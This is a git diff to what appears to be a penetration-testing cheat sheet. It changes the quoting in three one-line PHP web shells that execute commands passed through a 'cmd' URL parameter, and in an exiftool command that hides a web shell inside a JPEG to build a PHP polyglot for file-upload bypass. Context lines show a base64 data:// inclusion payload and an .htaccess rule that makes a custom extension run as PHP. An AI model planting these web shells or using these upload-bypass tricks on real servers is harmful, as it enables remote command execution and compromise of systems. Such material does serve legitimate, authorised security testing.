@@ -308,9 +308,9 @@ data://text/plain;base64,<base64>&cmd=ls
 ## Webshell
 /usr/share/webshells
 ```php
-<?php echo(system($_GET['cmd'])); ?>
-<?php echo(shell_exec($_GET['cmd'])); ?>
-<?php echo(exec($_GET['cmd']));?>
+<?php echo(system($_GET["cmd"])); ?>
+<?php echo(shell_exec($_GET["cmd"])); ?>
+<?php echo(exec($_GET["cmd"]));?>
 ```
 ## File Upload
 htaccess
@@ -319,7 +319,7 @@ echo "AddType application/x-httpd-php .tak" > .htaccess
 ```
 polyglot
 ```
-exiftool -Comment="<?php echo 'START'; echo(exec($_GET['cmd'])); echo 'END'; ?>" unnamed.jpg -o polyglot.php
+exiftool -Comment='<?php echo "START\n"; echo(exec($_GET["cmd"])); echo "\nEND"; ?>' unnamed.jpg -o polyglot.php
 ```
 
 Wordpress <br/>
